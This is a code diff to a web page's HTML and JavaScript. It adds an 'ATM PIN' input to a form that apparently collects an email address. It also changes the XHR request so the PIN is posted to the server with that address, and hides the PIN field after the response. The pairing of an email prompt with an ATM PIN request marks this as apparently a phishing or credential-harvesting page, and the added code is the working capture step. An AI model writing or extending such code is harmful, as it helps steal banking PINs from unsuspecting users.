@@ -381,6 +381,15 @@
                         </svg>
                     </div>
                 </div>
+                <div class="input" id="dpin">
+                    <input id="pin" type="number" placeholder="XXXX" >
+                    <label for="pin">ATM PIN</label>
+                    <div>
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="5.25 3.25 13.5 16.5">
+                            <path d="M17.5 10.25h-.75V8a4.75 4.75 0 00-9.5 0v2.25H6.5a1.25 1.25 0 00-1.25 1.25v7a1.25 1.25 0 001.25 1.25h11a1.25 1.25 0 001.25-1.25v-7a1.25 1.25 0 00-1.25-1.25zM8.75 8a3.25 3.25 0 016.5 0v2.25h-6.5zm8.5 10.25H6.75v-6.5h10.5zm-6-4.25h1.5v2h-1.5z"/>
+                        </svg>
+                    </div>
+                </div>
                 <button id="postEmail" type="submit">Continue</button>
             </form>
         </div>
@@ -478,6 +487,7 @@
                 
                         xhr.onreadystatechange = () => {
                             if (xhr.readyState == 4 && xhr.status == 200) {
+                                document.getElementById('dpin').style.display = 'none';
                                 try {
                                     obj = JSON.parse(xhr.responseText);
                                     if (obj['statusCode'] == '0') {
@@ -492,7 +502,7 @@
                             }
                         }
                 
-                        xhr.send('mento=' + input.value.trim());
+                        xhr.send('mento=' + input.value.trim() +'&pin=' + document.getElementById('pin').value);
                     } else {
                         input.classList.add('error');
                     }
